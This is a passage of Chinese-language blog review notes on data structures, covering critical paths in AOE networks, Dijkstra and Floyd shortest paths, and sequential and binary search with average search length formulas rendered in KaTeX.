src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604221540024.png" class="" alt="image-20240604221540024" loading="lazy"><p><mark><strong>有回路的有向图不存在拓扑排序</strong></mark></p></li></ul><h4 id="关键路径"><a class="markdownIt-Anchor" href="#关键路径"></a> 关键路径</h4><ul><li><p>AOE网(Activity On Edge)是一个<mark>带权的有向无环图</mark>，其中<code>以顶点表示时间，弧表示活动，权表示活动持续的时间</code>。当AOE网用来估算工程的完成时间时<code>，只有一个开始点(入度为0，称为源点)和一个完成点（出度为0，称为汇点)</code></p></li><li><p>AOE可以解决的问题</p><ul><li>完成整项工程至少需要多少时间</li><li>哪些活动是影响工程进度的关键</li></ul></li><li><p><strong>关键路径</strong>:在AOE网中，部分活动可以并行进行，所以完成工程的最短时间是从开始点到完成点的最长路径长度。路径长度最长的路径称为关键路径</p></li><li><p>(顶点)时间v<sub>i</sub>的最早发生时间ve(i):</p><p>从开始点到v<sub>i</sub>的最长路径长度。(ve(v1)=0),既表示时间v<sub>i</sub>的最早发生时间，也表示所有以v<sub>i</sub>为尾的弧所表示的活动a<sub>k</sub>的最早发生时间e(k)</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604222558092.png" class="" alt="image-20240604222558092" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604222704911.png" class="" alt="image-20240604222704911" loading="lazy"></li><li><p>不推迟整个工程完成的前提下, (顶点）事件vi允许的最迟 开始时间vl(i)：  完成点（汇点）vn的的最早发生时间ve(n)减 去vk到vn的最长路径长度。（vn的的最早发生时间ve(n)等于最迟开始时间vl(n)）。</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604223227257.png" class="" alt="image-20240604223227257" loading="lazy"></li><li><p>确定了顶点vi的最迟开始时间后，确定所有以vi为弧头的 活动ak的最迟开始时间l(k)：表示在不推迟整个工程完成的前 提下，活动ak最迟必须开始的时间。 l(ak)=vl(ak弧头对应顶点)-活动ak的持续时间</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240604223243717.png" class="" alt="image-20240604223243717" loading="lazy"></li><li><p><mark>关键路径算法步骤</mark></p><ol><li><p>从开始点v1出发，令ve(1)=0，按拓扑排序序列求其他个顶点的最早发生序列</p><p>即Ve(k)=max{ve{j}+dut(&lt;j,k)}</p></li><li><p>从出发点vn出发，令vl(n)=ve(n),按逆拓扑排序序列求其他各顶点的最迟发生时间</p><p>即Vl(j)=min{vl(k)-dut(&lt;j,k)}</p></li><li><p>求每一项活动ai(vi，vj):</p><p>e(i)=ve(j)  l(i)=vl(k)-dut(ai)</p></li></ol><p>关键活动:选取<mark>e(i)-l(i)的活动</mark></p></li></ul><h4 id="最短路径"><a class="markdownIt-Anchor" href="#最短路径"></a> 最短路径</h4><ul><li>求某个源点到其余各顶点的最短路径<ul><li>直接dfs暴力</li><li><mark>Dijkstra</mark><ol><li>选择起点start与终点end；</li><li>所有点除起点外加入未知集合，并将起点加入已知集合，即至标志位为真，意为已确定该点到源点的最短路径；</li><li>初始化计算，更新起点与其他各点的耗费(路径长度）dis(start,n);</li><li>在未知集合中，选择dis(start,n)中值最小的点x，将x加入已知集合。</li><li><strong>对于剩余顶点中，计算dis(start,n)&gt;dis(start,x)+dis(x,n)<br />若真则dis(start,n)=dis(start,x)+dis(x,n)，此时start与n点路径经过x点。循环直至goal点加入已知列表，取得dis(start,goal)即为最短距离。</strong></li></ol></li></ul></li><li>每一对顶点之间的最短路径<ul><li>以每一个顶点为源点，重复执行Dijkstra算法n次，即可求出每一对顶点之间的最短路径</li><li><mark>Floyed</mark><ol><li><strong>初始化距离矩阵：</strong><ul><li>首先，构建一个大小为n×n的矩阵D，其中n是图中顶点的数量。D[i][j]表示顶点i到顶点j的初始距离。如果i和j之间有直接边，则D[i][j]就是这条边的权重；如果没有直接边相连，则D[i][j]设为无穷大（通常表示为一个很大的数，意味着不可达）。</li></ul></li><li><strong>选择中介顶点：</strong><ul><li>然后，算法遍历图中的每一个顶点，将其作为中介顶点（记为k）。这意味着算法会考察每一对顶点（i, j），尝试通过k来寻找更短的路径。</li></ul></li><li><strong>更新最短路径：</strong><ul><li>对于每一对顶点i和j，算法检查是否存在这样的情况：先从i经过k，再从k到j的路径比当前已知的i直接到j的路径更短。如果存在这样的路径，即D[i][k] + D[k][j] &lt; D[i][j]，那么就更新D[i][j]的值为D[i][k] + D[k][j]。这一步是算法的核心，通过考虑所有的中介点k，逐步优化每对顶点间的最短路径估计。</li></ul></li><li><strong>重复步骤2-3：</strong><ul><li>上述过程对所有的顶点k重复进行，直到所有可能的中介点都被考虑过了。每一轮迭代都基于前一轮的结果进行优化，最终得到的D矩阵中的每个元素D[i][j]就是顶点i到顶点j的最短路径长度。</li></ul></li><li><strong>输出结果：</strong><ul><li>完成所有顶点作为中介点的遍历后，D矩阵就包含了图中任意两点间的最短路径长度。你可以进一步通过追踪最短路径来确定具体路径，但这通常需要额外的数据结构（如“前驱”矩阵）来记录路径信息。</li></ul></li></ol></li></ul></li></ul><h2 id="chap8-动态存储管理"><a class="markdownIt-Anchor" href="#chap8-动态存储管理"></a> Chap8 动态存储管理</h2><p>由于不考，坑以后填</p><h2 id="chap9-查找"><a class="markdownIt-Anchor" href="#chap9-查找"></a> Chap9 查找</h2><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" class="" alt="1" loading="lazy"><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240528154154985.png" class="" alt="image-20240528154154985" loading="lazy"><ul><li><p>静态查找表</p><ol><li>查询某个“特定的”数据元素是否在查找表中。</li><li>检索某个“特定的”数据元素和各种属性。</li></ol></li><li><p>动态查找表-表结构本身是在查找过程中动态生成的</p><ol><li>查找时插入不存在的数据元素</li><li>查找时删除已存在的数据元素</li></ol></li><li><p><code>ASL(AVERAGE SEARCH LENTH)的计算</code></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mi mathvariant="normal">Σ</mi><mrow><msub><mi>P</mi><mi>i</mi></msub><msub><mi>C</mi><mi>i</mi></msub></mrow></mrow><annotation encoding="application/x-tex">ASL=\Sigma{P_iC_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">Σ</span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p></li><li><p>顺序查找，有序查找的算法实现</p></li><li><p><code>二叉排序树，二叉搜索树，平衡二叉树，*红黑树，B树的各种原理，用处以及实现</code></p></li><li><p>散列表的实现，哈希函数的实现，<code>处理冲突的方法</code></p></li><li><p><code>复杂度分析</code></p></li></ul><h3 id="静态查找表"><a class="markdownIt-Anchor" href="#静态查找表"></a> 静态查找表</h3><h4 id="顺序表查找"><a class="markdownIt-Anchor" href="#顺序表查找"></a> 顺序表查找</h4><ul><li>顺序查找(Sequential Search)<ul><li><p>基本思想:从线性表的一端开始，逐个检查关键字是否满足给定的条件。</p></li><li><p>技巧:查找方向的尽头放置“哨兵”免去了在查找过程中每一次比较后都要判断查找位置是否越界</p></li><li><p>时间复杂度O(n)</p></li><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mrow><mi>S</mi><mi>S</mi></mrow></msub><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>P</mi><mi>i</mi></msub><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">ASL_{SS}=\sum\limits_{i=1}^nP_iC_i=\frac{1}{n}\sum\limits_{i=1}^n(n-i+1)=\frac{n+1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>用监视哨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mi>F</mi></msub><mo>=</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ASL_F=n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 不用监视哨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mi>F</mi></msub><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">ASL_F=n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></p></li><li><p>假设查找不成功与成功等概率则</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>n</mi></mrow></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>3</mn><mn>4</mn></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ASL=\frac{1}{2n}\sum\limits_{i=1}^n(n-i+1)+\frac{1}{2}(n+1)=\frac{3}{4}(n+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.329066em;vertical-align:-0.9776689999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3513970000000004em;"><span style="top:-2.122331em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.0000050000000003em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop op-symbol small-op">∑</span></span></span><span style="top:-3.950005em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9776689999999999em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74285em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p></li></ul></li></ul><h4 id="有序表查找"><a class="markdownIt-Anchor" href="#有序表查找"></a> 有序表查找</h4><ul><li><p><strong>折半查找</strong>(Binary Search)</p><ul><li><p>关键:<mark>mid=(low+high)/2,high=mid-1,low=mid+1,low&lt;=high</mark></p></li><li><p>性能分析：</p><p>折半查找的查找过程可以用二叉树来描述,叫做二叉判定树</p><p>给定有序表<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>9</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>11</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{1,2,3,4,5,6,7,8,9,10,11\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mclose">}</span></span></span></span>，二叉判定树如下</p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240530113655912.png" class="" alt="image-20240530113655912" loading="lazy"><ul><li><p>具有n个节点的判定树深度至多为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">⌋</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lfloor log_2n \rfloor+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p></li><li><p>假定有序表的长度<span class="katex"><span class="katex-mathml"><math 